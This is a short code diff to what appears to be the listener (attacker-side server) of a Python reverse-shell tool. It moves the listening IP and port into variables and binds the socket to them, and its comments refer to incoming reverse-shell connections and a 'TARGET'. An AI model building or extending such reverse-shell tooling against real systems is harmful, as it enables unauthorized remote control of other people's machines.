@@ -3,6 +3,13 @@ import json
 import os
 
 
+# **************************************************************************
+# ***** v ENTER LOCAL HOST (LHOST) IP & LISTENING PORT (LPORT) HERE! v *****
+# **************************************************************************
+LHOST = '127.0.0.1'
+LPORT = 9001
+
+
 # json dumps the desired command, encodes it, and then sends it to the TARGET via socket's send function.
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -81,15 +88,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # Binding the LHOST IP address to the designated LPORT.
 
 
-
-# **************************************************************************
-# ***** v ENTER LOCAL HOST (LHOST) IP & LISTENING PORT (LPORT) HERE! v *****
-# **************************************************************************
-sock.bind(('ENTER LHOST IP HERE', 5555))
-# **************************************************************************
-# ***** v ENTER LOCAL HOST (LHOST) IP & LISTENING PORT (LPORT) HERE! v *****
-# **************************************************************************
-
+sock.bind((LHOST, LPORT))
 
 
 # Listen for up to 5 incoming connections from reverse shell.
